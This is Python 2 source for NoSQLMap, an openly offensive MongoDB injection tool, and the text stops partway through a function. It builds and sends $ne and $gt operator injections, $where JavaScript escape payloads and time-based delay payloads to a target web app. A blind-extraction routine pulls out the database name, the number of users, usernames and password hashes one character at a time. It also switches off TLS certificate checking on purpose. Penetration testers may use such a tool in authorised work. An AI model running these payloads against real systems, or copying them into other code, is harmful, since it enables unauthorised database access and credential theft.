#!/usr/bin/python
#NoSQLMap Copyright 2016 Russell Butturini
#This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.

import urllib
import urllib2
import string
import nsmmongo
from sys import version_info
import datetime
import time
import random

#Fix for dealing with self-signed certificates.  This is wrong and highly discouraged, but it's a hacking tool, so it's fixed with a hack.  Get over it :-)

if version_info >= (2, 7, 9):
    import ssl
    ssl._create_default_https_context = ssl._create_unverified_context

def getApps(webPort,victim,uri,https,verb,requestHeaders):
    print "Web App Attacks (GET)"
    print "==============="
    paramName = []
    global testNum
    global httpMethod
    httpMethod = "GET"
    testNum = 1
    paramValue = []
    global vulnAddrs
    vulnAddrs = []
    global possAddrs
    possAddrs = []
    timeVulnsStr = []
    timeVulnsInt = []
    appUp = False
    strTbAttack = False
    intTbAttack = False
    trueStr = False
    trueInt = False
    global lt24
    lt24 = False
    global str24
    str24 = False
    global int24
    int24 = False

    #Verify app is working.
    print "Checking to see if site at " + str(victim).strip() + ":" + str(webPort).strip() + str(uri).strip() + " is up..."

    if https == "OFF":
        appURL = "http://" + str(victim).strip() + ":" + str(webPort).strip() + str(uri).strip()

    elif https == "ON":
        appURL = "https://" + str(victim).strip() + ":" + str(webPort).strip() + str(uri).strip()
    try:
        req = urllib2.Request(appURL, None, requestHeaders)
        appRespCode = urllib2.urlopen(req).getcode()
        if appRespCode == 200:
            normLength = int(len(urllib2.urlopen(req).read()))
            timeReq = urllib2.urlopen(req)
            start = time.time()
            page = timeReq.read()
            end = time.time()
            timeReq.close()
            timeBase = round((end - start), 3)

            if verb == "ON":
                print "App is up! Got response length of " + str(normLength) + " and response time of " + str(timeBase) + " seconds.  Starting injection test.\n"

            else:
                print "App is up!"
            appUp = True

        else:
            print "Got " + str(appRespCode) + "from the app, check your options."
    except Exception,e:
        print e
        print "Looks like the server didn't respond.  Check your options."

    if appUp == True:

        injectSize = raw_input("Baseline test-Enter random string size: ")
        injectString = randInjString(int(injectSize))
        print "Using " + injectString + " for injection testing.\n"

        #Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
        #Add error handling for Non-200 HTTP response codes if random strings freaks out the app.
        if "?" not in appURL:
            print "No URI parameters provided for GET request...Check your options.\n"
            raw_input("Press enter to continue...")
            return()

        randomUri = buildUri(appURL,injectString)
        print "URI : " + randomUri
        req = urllib2.Request(randomUri, None, requestHeaders)

        if verb == "ON":
            print "Checking random injected parameter HTTP response size using " + randomUri +"...\n"
        else:
            print "Sending random parameter value..."

        randLength = int(len(urllib2.urlopen(req).read()))
        print "Got response length of " + str(randLength) + "."
        randNormDelta = abs(normLength - randLength)

        if randNormDelta == 0:
            print "No change in response size injecting a random parameter..\n"
        else:
            print "Random value variance: " + str(randNormDelta) + "\n"

        if verb == "ON":
            print "Testing Mongo PHP not equals associative array injection using " + uriArray[1] +"..."
        else:
            print "Test 1: PHP/ExpressJS != associative array injection"

        #Test for errors returned by injection
        req = urllib2.Request(uriArray[1], None, requestHeaders)
        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)

        if errorCheck == False:
            injLen = int(len(urllib2.urlopen(req).read()))
            checkResult(randLength,injLen,testNum,verb,None)
            testNum += 1
        else:
            testNum += 1

        print "\n"
        if verb == "ON":
            print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
            print "Injecting " + uriArray[2]
        else:
            print "Test 2: $where injection (string escape)"

        req = urllib2.Request(uriArray[2], None, requestHeaders)
        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)


        if errorCheck == False:
            injLen = int(len(urllib2.urlopen(req).read()))
            checkResult(randLength,injLen,testNum,verb,None)
            testNum += 1

        else:
            testNum += 1

        print "\n"
        if verb == "ON":
            print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
            print "Injecting " + uriArray[3]
        else:
            print "Test 3:  $where injection (integer escape)"

        req = urllib2.Request(uriArray[3], None, requestHeaders)
        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)


        if errorCheck == False:
            injLen = int(len(urllib2.urlopen(req).read()))
            checkResult(randLength,injLen,testNum,verb,None)
            testNum +=1

        else:
            testNum +=1

        #Start a single record attack in case the app expects only one record back
        print "\n"
        if verb == "ON":
            print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
            print " Injecting " + uriArray[4]
        else:
            print "Test 4: $where injection string escape (single record)"

        req = urllib2.Request(uriArray[4], None, requestHeaders)
        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)

        if errorCheck == False:
            injLen = int(len(urllib2.urlopen(req).read()))
            checkResult(randLength,injLen,testNum,verb,None)
            testNum += 1
        else:
            testNum += 1

        print "\n"
        if verb == "ON":
            print "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
            print " Injecting " + uriArray[5]
        else:
            print "Test 5: $where injection integer escape (single record)"

        req = urllib2.Request(uriArray[5], None, requestHeaders)
        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)

        if errorCheck == False:
            injLen = int(len(urllib2.urlopen(req).read()))
            checkResult(randLength,injLen,testNum,verb,None)
            testNum +=1

        else:
            testNum += 1

        print "\n"
        if verb == "ON":
            print "Testing Mongo this not equals string escape attack for all records..."
            print " Injecting " + uriArray[6]
        else:
            print "Test 6: This != injection (string escape)"

        req = urllib2.Request(uriArray[6], None, requestHeaders)
        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)

        if errorCheck == False:
            injLen = int(len(urllib2.urlopen(req).read()))
            checkResult(randLength,injLen,testNum,verb,None)
            testNum += 1
        else:
            testNum += 1

        print "\n"
        if verb == "ON":
            print "Testing Mongo this not equals integer escape attack for all records..."
            print " Injecting " + uriArray[7]
        else:
            print "Test 7: This != injection (integer escape)"

        req = urllib2.Request(uriArray[7], None, requestHeaders)
        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)

        if errorCheck == False:
            injLen = int(len(urllib2.urlopen(req).read()))
            checkResult(randLength,injLen,testNum,verb,None)
            testNum += 1
        else:
            testNum += 1
        print "\n"

        if verb == "ON":
            print "Testing  PHP/ExpressJS > undefined attack for all records..."
            print "Injecting " + uriArray[8]

        else:
            print "Test 8: PHP/ExpressJS > Undefined Injection"

        req = urllib2.Request(uriArray[8], None, requestHeaders)
        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)

        if errorCheck == False:
            injLen = int(len(urllib2.urlopen(req).read()))
            checkResult(randLength,injLen,testNum,verb,None)
            testNum += 1


        doTimeAttack = raw_input("Start timing based tests (y/n)? ")

        if doTimeAttack.lower() == "y":
            print "Starting Javascript string escape time based injection..."
            req = urllib2.Request(uriArray[18], None, requestHeaders)
            start = time.time()
            strTimeInj = urllib2.urlopen(req)
            page = strTimeInj.read()
            end = time.time()
            strTimeInj.close()
            #print str(end)
            #print str(start)
            strTimeDelta = (int(round((end - start), 3)) - timeBase)
            #print str(strTimeDelta)
            if strTimeDelta > 25:
                print "HTTP load time variance was " + str(strTimeDelta) +" seconds! Injection possible."
                strTbAttack = True

            else:
                print "HTTP load time variance was only " + str(strTimeDelta) + " seconds.  Injection probably didn't work."
                strTbAttack = False

            print "Starting Javascript integer escape time based injection..."
            req = urllib2.Request(uriArray[9], None, requestHeaders)
            start = time.time()
            intTimeInj = urllib2.urlopen(req)
            page = intTimeInj.read()
            end = time.time()
            intTimeInj.close()
            #print str(end)
            #print str(start)
            intTimeDelta = (int(round((end - start), 3)) - timeBase)
            #print str(strTimeDelta)
            if intTimeDelta > 25:
                print "HTTP load time variance was " + str(intTimeDelta) +" seconds! Injection possible."
                intTbAttack = True

            else:
                print "HTTP load time variance was only " + str(intTimeDelta) + " seconds.  Injection probably didn't work."
                intTbAttack = False

        if lt24 == True:
            bfInfo = raw_input("MongoDB < 2.4 detected.  Start brute forcing database info (y/n)? ")

            if bfInfo.lower == "y":
                getDBInfo()


        print "\n"
        print "Vulnerable URLs:"
        print "\n".join(vulnAddrs)
        print "\n"
        print "Possibly vulnerable URLs:"
        print"\n".join(possAddrs)
        print "\n"
        print "Timing based attacks:"

        if strTbAttack == True:
            print "String attack-Successful"
        else:
            print "String attack-Unsuccessful"
        if intTbAttack == True:
            print "Integer attack-Successful"
        else:
            print "Integer attack-Unsuccessful"

        fileOut = raw_input("Save results to file (y/n)? ")

        if fileOut.lower() == "y":
            savePath = raw_input("Enter output file name: ")
            fo = open(savePath, "wb")
            fo.write ("Vulnerable URLs:\n")
            fo.write("\n".join(vulnAddrs))
            fo.write("\n\n")
            fo.write("Possibly Vulnerable URLs:\n")
            fo.write("\n".join(possAddrs))
            fo.write("\n")
            fo.write("Timing based attacks:\n")

            if strTbAttack == True:
                fo.write("String Attack-Successful\n")
            else:
                fo.write("String Attack-Unsuccessful\n")
            fo.write("\n")

            if intTbAttack == True:
                fo.write("Integer attack-Successful\n")
            else:
                fo.write("Integer attack-Unsuccessful\n")
            fo.write("\n")
            fo.close()

    raw_input("Press enter to continue...")
    return()

def postApps(victim,webPort,uri,https,verb,postData,requestHeaders):
    print "Web App Attacks (POST)"
    print "==============="
    paramName = []
    paramValue = []
    global vulnAddrs
    global httpMethod
    httpMethod = "POST"
    vulnAddrs = []
    global possAddrs
    possAddrs = []
    timeVulnsStr = []
    timeVulnsInt = []
    appUp = False
    strTbAttack = False
    intTbAttack = False
    trueStr = False
    trueInt = False
    global neDict
    global gtDict
    testNum = 1

    #Verify app is working.
    print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."

    if https == "OFF":
        appURL = "http://" + str(victim) + ":" + str(webPort) + str(uri)

    elif https == "ON":
        appURL = "https://" + str(victim) + ":" + str(webPort) + str(uri)

    try:
        body = urllib.urlencode(postData)
        req = urllib2.Request(appURL,body, requestHeaders)
        appRespCode = urllib2.urlopen(req).getcode()

        if appRespCode == 200:

            normLength = int(len(urllib2.urlopen(req).read()))
            timeReq = urllib2.urlopen(req)
            start = time.time()
            page = timeReq.read()
            end = time.time()
            timeReq.close()
            timeBase = round((end - start), 3)

            if verb == "ON":
                print "App is up! Got response length of " + str(normLength) + " and response time of " + str(timeBase) + " seconds.  Starting injection test.\n"

            else:
                print "App is up!"
            appUp = True
        else:
            print "Got " + str(appRespCode) + "from the app, check your options."

    except Exception,e:
        print e
        print "Looks like the server didn't respond.  Check your options."

    if appUp == True:

        menuItem = 1
        print "List of parameters:"
        for params in postData.keys():
            print str(menuItem) + "-" + params
            menuItem += 1

        try:
            injIndex = raw_input("Which parameter should we inject? ")
            injOpt = str(postData.keys()[int(injIndex)-1])
            print "Injecting the " + injOpt + " parameter..."
        except:
            raw_input("Something went wrong.  Press enter to return to the main menu...")
            return

        injectSize = raw_input("Baseline test-Enter random string size: ")
        injectString = randInjString(int(injectSize))
        print "Using " + injectString + " for injection testing.\n"

        #Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
        #Add error handling for Non-200 HTTP response codes if random strings freak out the app.
        postData.update({injOpt:injectString})
        if verb == "ON":
            print "Checking random injected parameter HTTP response size sending " + str(postData) +"...\n"

        else:
            print "Sending random parameter value..."

        body = urllib.urlencode(postData)
        req = urllib2.Request(appURL,body, requestHeaders)
        randLength = int(len(urllib2.urlopen(req).read()))
        print "Got response length of " + str(randLength) + "."

        randNormDelta = abs(normLength - randLength)

        if randNormDelta == 0:
            print "No change in response size injecting a random parameter..\n"
        else:
            print "Random value variance: " + str(randNormDelta) + "\n"

        #Generate not equals injection
        neDict = postData
        neDict[injOpt + "[$ne]"] = neDict[injOpt]
        del neDict[injOpt]
        body = urllib.urlencode(neDict)
        req = urllib2.Request(appURL,body, requestHeaders)
        if verb == "ON":
            print "Testing Mongo PHP not equals associative array injection using " + str(postData) +"..."

        else:
            print "Test 1: PHP/ExpressJS != associative array injection"

        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)

        if errorCheck == False:
            injLen = int(len(urllib2.urlopen(req).read()))
            checkResult(randLength,injLen,testNum,verb,postData)
            testNum += 1

        else:
            testNum +=1
        print "\n"

        #Delete the extra key
        del postData[injOpt + "[$ne]"]

        #generate $gt injection
        gtDict = postData
        gtDict.update({injOpt:""})
        gtDict[injOpt + "[$gt]"] = gtDict[injOpt]
        del gtDict[injOpt]
        body = urllib.urlencode(gtDict)
        req = urllib2.Request(appURL,body, requestHeaders)
        if verb == "ON":
            print "Testing PHP/ExpressJS >Undefined Injection using " + str(postData) + "..."

        else:
            print "Test 2:  PHP/ExpressJS > Undefined Injection"

        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)

        if errorCheck == False:
            injLen = int(len(urllib2.urlopen(req).read()))
            checkResult(randLength,injLen,testNum,verb,postData)
            testNum += 1

        postData.update({injOpt:"a'; return db.a.find(); var dummy='!"})
        body = urllib.urlencode(postData)
        req = urllib2.Request(appURL,body, requestHeaders)
        if verb == "ON":
            print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
            print "Injecting " + str(postData)

        else:
            print "Test 3: $where injection (string escape)"

        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)

        if errorCheck == False:
            injLen = int(len(urllib2.urlopen(req).read()))
            checkResult(randLength,injLen,testNum,verb,postData)
            testNum += 1
        else:
            testNum += 1

        print "\n"

        postData.update({injOpt:"1; return db.a.find(); var dummy=1"})
        body = urllib.urlencode(postData)
        req = urllib2.Request(appURL,body, requestHeaders)
        if verb == "ON":
            print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
            print "Injecting " + str(postData)
        else:
            print "Test 4: $where injection (integer escape)"

        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)

        if errorCheck == False:
            injLen = int(len(urllib2.urlopen(req).read()))
            checkResult(randLength,injLen,testNum,verb,postData)
            testNum += 1
        else:
            testNum += 1
        print "\n"

        #Start a single record attack in case the app expects only one record back
        postData.update({injOpt:"a'; return db.a.findOne(); var dummy='!"})
        body = urllib.urlencode(postData)
        req = urllib2.Request(appURL,body, requestHeaders)
        if verb == "ON":
            print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
            print " Injecting " + str(postData)

        else:
            print "Test 5: $where injection string escape (single record)"

        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)

        if errorCheck == False:
            injLen = int(len(urllib2.urlopen(req).read()))
            checkResult(randLength,injLen,testNum,verb,postData)
            testNum += 1

        else:
            testNum += 1
        print "\n"

        postData.update({injOpt:"1; return db.a.findOne(); var dummy=1"})
        body = urllib.urlencode(postData)
        req = urllib2.Request(appURL,body, requestHeaders)
        if verb == "ON":
            print "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
            print " Injecting " + str(postData)

        else:
            print "Test 6: $where injection integer escape (single record)"

        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)

        if errorCheck == False:
            injLen = int(len(urllib2.urlopen(req).read()))
            checkResult(randLength,injLen,testNum,verb,postData)
            testNum += 1

        else:
            testNum += 1
        print "\n"

        postData.update({injOpt:"a'; return this.a != '" + injectString + "'; var dummy='!"})
        body = urllib.urlencode(postData)
        req = urllib2.Request(appURL,body, requestHeaders)

        if verb == "ON":
            print "Testing Mongo this not equals string escape attack for all records..."
            print " Injecting " + str(postData)

        else:
            print "Test 7: This != injection (string escape)"

        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)

        if errorCheck == False:
            injLen = int(len(urllib2.urlopen(req).read()))
            checkResult(randLength,injLen,testNum,verb,postData)
            testNum += 1
            print "\n"
        else:
            testNum += 1

        postData.update({injOpt:"1; return this.a != '" + injectString + "'; var dummy=1"})
        body = urllib.urlencode(postData)
        req = urllib2.Request(appURL,body, requestHeaders)

        if verb == "ON":
            print "Testing Mongo this not equals integer escape attack for all records..."
            print " Injecting " + str(postData)
        else:
            print "Test 8:  This != injection (integer escape)"

        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)

        if errorCheck == False:
            injLen = int(len(urllib2.urlopen(req).read()))
            checkResult(randLength,injLen,testNum,verb,postData)
            testNum += 1

        else:
            testNum += 1
        print "\n"

        doTimeAttack = raw_input("Start timing based tests (y/n)? ")

        if doTimeAttack == "y" or doTimeAttack == "Y":
            print "Starting Javascript string escape time based injection..."
            postData.update({injOpt:"a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(curDate.getTime()-date.getTime()))/1000 < 10); return true; var dummy='a"})
            body = urllib.urlencode(postData)
            conn = urllib2.urlopen(req,body)
            start = time.time()
            page = conn.read()
            end = time.time()
            conn.close()
            print str(end)
            print str(start)
            strTimeDelta = (int(round((end - start), 3)) - timeBase)
            #print str(strTimeDelta)
            if strTimeDelta > 25:
                print "HTTP load time variance was " + str(strTimeDelta) +"  seconds! Injection possible."
                strTbAttack = True

            else:
                print "HTTP load time variance was only " + str(strTimeDelta) + " seconds.  Injection probably didn't work."
                strTbAttack = False

            print "Starting Javascript integer escape time based injection..."

            postData.update({injOpt:"1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1"})
            body = urllib.urlencode(postData)
            start = time.time()
            conn = urllib2.urlopen(req,body)
            page = conn.read()
            end = time.time()
            conn.close()
            print str(end)
            print str(start)
            intTimeDelta = ((end-start) - timeBase)
            #print str(strTimeDelta)
            if intTimeDelta > 25:
                print "HTTP load time variance was " + str(intTimeDelta) +" seconds! Injection possible."
                intTbAttack = True

            else:
                print "HTTP load time variance was only " + str(intTimeDelta) + " seconds.  Injection probably didn't work."
                intTbAttack = False

        print "\n"
        print "Exploitable requests:"
        print "\n".join(vulnAddrs)
        print "\n"
        print "Possibly vulnerable requests:"
        print"\n".join(possAddrs)
        print "\n"
        print "Timing based attacks:"

        if strTbAttack == True:
            print "String attack-Successful"
        else:
            print "String attack-Unsuccessful"
        if intTbAttack == True:
            print "Integer attack-Successful"
        else:
            print "Integer attack-Unsuccessful"

        fileOut = raw_input("Save results to file (y/n)? ")

        if fileOut.lower() == "y":
            savePath = raw_input("Enter output file name: ")
            fo = open(savePath, "wb")
            fo.write ("Vulnerable Requests:\n")
            fo.write("\n".join(vulnAddrs))
            fo.write("\n\n")
            fo.write("Possibly Vulnerable Requests:\n")
            fo.write("\n".join(possAddrs))
            fo.write("\n")
            fo.write("Timing based attacks:\n")

            if strTbAttack == True:
                fo.write("String Attack-Successful\n")
            else:
                fo.write("String Attack-Unsuccessful\n")
            fo.write("\n")

            if intTbAttack == True:
                fo.write("Integer attack-Successful\n")
            else:
                fo.write("Integer attack-Unsuccessful\n")
            fo.write("\n")
            fo.close()

    raw_input("Press enter to continue...")
    return()

def errorTest (errorCheck,testNum):
    global possAddrs
    global httpMethod
    global neDict
    global gtDict
    global postData

    if errorCheck.find('ReferenceError') != -1 or errorCheck.find('SyntaxError') != -1 or errorCheck.find('ILLEGAL') != -1:
        print "Injection returned a MongoDB Error.  Injection may be possible."

        if httpMethod == "GET":
            possAddrs.append(uriArray[testNum])
            return True

        else:
            if testNum == 1:
                possAddrs.append(str(neDict))
                return True

            elif testNum == 2:
                possAddrs.append(str(gtDict))
                return True

            else:
                possAddrs.append(str(postData))
                return True
    else:
        return False



def checkResult(baseSize,respSize,testNum,verb,postData):
    global vulnAddrs
    global possAddrs
    global lt24
    global str24
    global int24
    global httpMethod
    global neDict
    global gtDict


    delta = abs(respSize - baseSize)
    if (delta >= 100) and (respSize != 0) :
        if verb == "ON":
            print "Response varied " + str(delta) + " bytes from random parameter value! Injection works!"
        else:
            print "Successful injection!"

        if httpMethod == "GET":
            vulnAddrs.append(uriArray[testNum])
        else:
            if testNum == 1:
                vulnAddrs.append(str(neDict))

            elif testNum == 2:
                vulnAddrs.append(str(gtDict))
            else:
                vulnAddrs.append(str(postData))

        if testNum == 3 or testNum == 5:
            lt24 = True
            str24 = True

        elif testNum == 4 or testNum == 6:
            lt24 = True
            int24 = True
        return

    elif (delta > 0) and (delta < 100) and (respSize != 0) :
        if verb == "ON":
            print "Response variance was only " + str(delta) + " bytes. Injection might have worked but difference is too small to be certain. "
        else:
            print "Possible injection."

        if httpMethod == "GET":
            possAddrs.append(uriArray[testNum])
        else:
            if testNum == 1:
                possAddrs.append(str(neDict))
            else:
                possAddrs.append(str(postData))
        return

    elif (delta == 0):
        if verb == "ON":
            print "Random string response size and not equals injection were the same. Injection did not work."
        else:
            print "Injection failed."
        return

    else:
        if verb == "ON":
            print "Injected response was smaller than random response.  Injection may have worked but requires verification."
        else:
            print "Possible injection."
        if httpMethod == "GET":
            possAddrs.append(uriArray[testNum])
        else:
            if testNum == 1:
                possAddrs.append(str(neDict))
            else:
                possAddrs.append(str(postData))
        return

def randInjString(size):
    print "What format should the random string take?"
    print "1-Alphanumeric"
    print "2-Letters only"
    print "3-Numbers only"
    print "4-Email address"
    format = True

    while format:
        format = raw_input("Select an option: ")

        if format == "1":
            chars = string.ascii_letters + string.digits
            return ''.join(random.choice(chars) for x in range(size))

        elif format == "2":
            chars = string.ascii_letters
            return ''.join(random.choice(chars) for x in range(size))

        elif format == "3":
            chars = string.digits
            return ''.join(random.choice(chars) for x in range(size))

        elif format == "4":
            chars = string.ascii_letters + string.digits
            return ''.join(random.choice(chars) for x in range(size)) + '@' + ''.join(random.choice(chars) for x in range(size)) + '.com'
        else:
            format = True
            print "Invalid selection."


def buildUri(origUri, randValue):
    paramName = []
    paramValue = []
    global uriArray
    uriArray = ["","","","","","","","","","","","","","","","","","",""]
    injOpt = []

    #Split the string between the path and parameters, and then split each parameter
    try:
        split_uri = origUri.split("?")
        params = split_uri[1].split("&")

    except:
        raw_input("Not able to parse the URL and parameters.  Check options settings.  Press enter to return to main menu...")
        return

    for item in params:
        index = item.find("=")
        paramName.append(item[0:index])
        paramValue.append(item[index + 1:len(item)])

    menuItem = 1
    print "List of parameters:"
    for params in paramName:
        print str(menuItem) + "-" + params
        menuItem += 1

    try:
        injIndex = raw_input("Enter parameters to inject in a comma separated list:  ")

        for params in injIndex.split(","):
            injOpt.append(paramName[int(params)-1])

        #injOpt = str(paramName[int(injIndex)-1])

        for params in injOpt:
            print "Injecting the " + params + " parameter..."

    except Exception:
        raw_input("Something went wrong.  Press enter to return to the main menu...")
        return

    x = 0
    uriArray[0] = split_uri[0] + "?"
    uriArray[1] = split_uri[0] + "?"
    uriArray[2] = split_uri[0] + "?"
    uriArray[3] = split_uri[0] + "?"
    uriArray[4] = split_uri[0] + "?"
    uriArray[5] = split_uri[0] + "?"
    uriArray[6] = split_uri[0] + "?"
    uriArray[7] = split_uri[0] + "?"
    uriArray[8] = split_uri[0] + "?"
    uriArray[9] = split_uri[0] + "?"
    uriArray[10] = split_uri[0] + "?"
    uriArray[11] = split_uri[0] + "?"
    uriArray[12] = split_uri[0] + "?"
    uriArray[13] = split_uri[0] + "?"
    uriArray[14] = split_uri[0] + "?"
    uriArray[15] = split_uri[0] + "?"
    uriArray[16] = split_uri[0] + "?"
    uriArray[17] = split_uri[0] + "?"
    uriArray[18] = split_uri[0] + "?"

    for item in paramName:

        if paramName[x] in injOpt:
            uriArray[0] += paramName[x] + "=" + randValue + "&"
            uriArray[1] += paramName[x] + "[$ne]=" + randValue + "&"
            uriArray[2] += paramName[x] + "=a'; return db.a.find(); var dummy='!" + "&"
            uriArray[3] += paramName[x] + "=1; return db.a.find(); var dummy=1" + "&"
            uriArray[4] += paramName[x] + "=a'; return db.a.findOne(); var dummy='!" + "&"
            uriArray[5] += paramName[x] + "=1; return db.a.findOne(); var dummy=1" + "&"
            uriArray[6] += paramName[x] + "=a'; return this.a != '" + randValue + "'; var dummy='!" + "&"
            uriArray[7] += paramName[x] + "=1; return this.a !=" + randValue + "; var dummy=1" + "&"
            uriArray[8] += paramName[x] + "[$gt]=&"
            uriArray[9] += paramName[x] + "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
            uriArray[10] += paramName[x] + "=a\"; return db.a.find(); var dummy='!" + "&"
            uriArray[11] += paramName[x] + "=a\"; return this.a != '" + randValue + "'; var dummy='!" + "&"
            uriArray[12] += paramName[x] + "=a\"; return db.a.findOne(); var dummy=\"!" + "&"
            uriArray[13] += paramName[x] + "=a\"; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=\"!" + "&"
            uriArray[14] += paramName[x] + "a'; return true; var dum='a"
            uriArray[15] += paramName[x] + "1; return true; var dum=2"
            #Add values that can be manipulated for database attacks
            uriArray[16] += paramName[x] + "=a\'; ---"
            uriArray[17] += paramName[x] + "=1; if ---"
            uriArray[18] += paramName[x] + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"

        else:
            uriArray[0] += paramName[x] + "=" + paramValue[x] + "&"
            uriArray[1] += paramName[x] + "=" + paramValue[x] + "&"
            uriArray[2] += paramName[x] + "=" + paramValue[x] + "&"
            uriArray[3] += paramName[x] + "=" + paramValue[x] + "&"
            uriArray[4] += paramName[x] + "=" + paramValue[x] + "&"
            uriArray[5] += paramName[x] + "=" + paramValue[x] + "&"
            uriArray[6] += paramName[x] + "=" + paramValue[x] + "&"
            uriArray[7] += paramName[x] + "=" + paramValue[x] + "&"
            uriArray[8] += paramName[x] + "=" + paramValue[x] + "&"
            uriArray[9] += paramName[x] + "=" + paramValue[x] + "&"
            uriArray[10] += paramName[x] + "=" + paramValue[x] + "&"
            uriArray[11] += paramName[x] + "=" + paramValue[x] + "&"
            uriArray[12] += paramName[x] + "=" + paramValue[x] + "&"
            uriArray[13] += paramName[x] + "=" + paramValue[x] + "&"
            uriArray[14] += paramName[x] + "=" + paramValue[x] + "&"
            uriArray[15] += paramName[x] + "=" + paramValue[x] + "&"
            uriArray[16] += paramName[x] + "=" + paramValue[x] + "&"
            uriArray[17] += paramName[x] + "=" + paramValue[x] + "&"
            uriArray[18] += paramName[x] + "=" + paramValue[x] + "&"
        x += 1

    #Clip the extra & off the end of the URL
    x = 0
    while x <= 18:
        uriArray[x]= uriArray[x][:-1]
        x += 1

    return uriArray[0]

def getDBInfo():
    curLen = 0
    nameLen = 0
    gotFullDb = False
    gotNameLen = False
    gotDbName = False
    gotColLen = False
    gotColName = False
    gotUserCnt = False
    finUser = False
    dbName = ""
    charCounter = 0
    nameCounter = 0
    usrCount = 0
    retrUsers = 0
    users = []
    hashes = []
    crackHash = ""

    chars = string.ascii_letters + string.digits
    print "Getting baseline True query return size..."
    trueUri = uriArray[16].replace("---","return true; var dummy ='!" + "&")
    #print "Debug " + str(trueUri)
    req = urllib2.Request(trueUri, None, requestHeaders)
    baseLen = int(len(urllib2.urlopen(req).read()))
    print "Got baseline true query length of " + str(baseLen)

    print "Calculating DB name length..."

    while gotNameLen == False:
        calcUri = uriArray[16].replace("---","var curdb = db.getName(); if (curdb.length ==" + str(curLen) + ") {return true;} var dum='a" + "&")
        #print "Debug: " + calcUri
        req = urllib2.Request(calcUri, None, requestHeaders)
        lenUri = int(len(urllib2.urlopen(req).read()))
        #print "Debug length: " + str(lenUri)

        if lenUri == baseLen:
            print "Got database name length of " + str(curLen) + " characters."
            gotNameLen = True

        else:
            curLen += 1

    print "Database Name: ",
    while gotDbName == False:
        charUri = uriArray[16].replace("---","var curdb = db.getName(); if (curdb.charAt(" + str(nameCounter) + ") == '"+ chars[charCounter] + "') { return true; } var dum='a" + "&")

        req = urllib2.Request(charUri, None, requestHeaders)
        lenUri = int(len(urllib2.urlopen(req).read()))

        if lenUri == baseLen:
            dbName = dbName + chars[charCounter]
            print chars[charCounter],
            nameCounter += 1
            charCounter = 0

            if nameCounter == curLen:
                gotDbName = True


        else:
            charCounter += 1
    print "\n"

    getUserInf = raw_input("Get database users and password hashes (y/n)? ")

    if getUserInf.lower() == "y":
        charCounter = 0
        nameCounter = 0
        #find the total number of users on the database
        while gotUserCnt == False:
            usrCntUri = uriArray[16].replace("---","var usrcnt = db.system.users.count(); if (usrcnt == " + str(usrCount) + ") { return true; } var dum='a")

            req = urllib2.Request(usrCntUri, None, requestHeaders)
            lenUri = int(len(urllib2.urlopen(req).read()))

            if lenUri == baseLen:
                print "Found " + str(usrCount) + " user(s)."
                gotUserCnt = True

            else:
                usrCount += 1

        usrChars = 0  #total number of characters in username
        charCounterUsr = 0 #position in the character array-Username
        rightCharsUsr = 0 #number of correct characters-Username
        rightCharsHash = 0 #number of correct characters-hash
        charCounterHash = 0 #position in the character array-hash
        username = ""
        pwdHash = ""
        charCountUsr = False
        query = "{}"

        while retrUsers < usrCount:
            if retrUsers == 0:
                while charCountUsr == False:
                    #different query to get the first user vs. others
                    usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.user.length == " + str(usrChars) + ") { return true; } var dum='a" + "&")

                    req = urllib2.Request(usrUri, None, requestHeaders)
                    lenUri = int(len(urllib2.urlopen(req).read()))

                    if lenUri == baseLen:
                        #Got the right number of characters
                        charCountUsr = True

                    else:
                        usrChars += 1

                while  rightCharsUsr < usrChars:
                    usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.user.charAt(" + str(rightCharsUsr) + ") == '"+ chars[charCounterUsr] + "') { return true; } var dum='a" + "&")

                    req = urllib2.Request(usrUri, None, requestHeaders)
                    lenUri = int(len(urllib2.urlopen(req).read()))

                    if lenUri == baseLen:
